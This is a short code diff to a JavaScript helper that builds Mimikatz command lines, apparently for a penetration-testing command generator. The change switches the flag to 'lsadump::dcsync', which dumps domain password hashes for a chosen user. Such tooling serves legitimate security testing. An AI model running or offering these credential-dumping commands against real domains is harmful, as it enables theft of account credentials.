@@ -228,7 +228,7 @@ function generateDumpHashesCommand() {
 	var user = document.querySelector("#form-dc-sync #user").value;
 	var netbios = document.querySelector("#form-dc-sync #netbios").value;
 
-	var flags = `"lsadump::golden /user:${netbios}\\${user}" "exit"`;
+	var flags = `"lsadump::dcsync /user:${netbios}\\${user}" "exit"`;
 
 	if (tool == "invoke-mimikatz") {
 		var command = `${tool} -Command '${flags}'`;
